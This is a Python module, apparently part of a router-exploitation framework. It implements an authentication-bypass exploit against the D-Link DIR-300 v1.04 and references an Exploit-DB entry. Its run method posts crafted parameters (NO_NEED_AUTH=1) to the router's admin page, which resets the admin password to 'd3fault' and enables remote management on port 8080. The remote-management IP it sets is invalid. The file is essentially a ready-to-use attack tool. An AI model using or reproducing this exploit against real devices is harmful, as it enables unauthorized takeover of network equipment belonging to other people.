import util
import urllib
from ..router_vuln import RouterVuln


class add_admin_300(RouterVuln):
    """Modify the default admin password to 'd3fault'
       http://www.exploit-db.com/exploits/15753/
    """
    def __init__(self):
        self.router = 'DIR-300 v1.04'
        self.vuln   = 'Change Admin Password'
        super(add_admin_300, self).__init__()

    def run(self):
        util.Msg('Changing admin password to \'d3fault\'...')
        url = 'http://%s/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0'%self.ip
        params = urllib.urlencode({'ACTION_POST':1,'admin_name':'admin',
                                   'admin_password1':'d3fault','admin_password2':'d3fault',
                                   'rt_enable_h':1,'rt_port':8080,'rt_ipaddr':'192.168.0.1337'})

        try:
            urllib.urlopen(url, params).read()
            util.Msg('Done.  Admin password changed to \'d3fault\'')
        except Exception, e:
            util.Error("Error: %s" % e)
            return
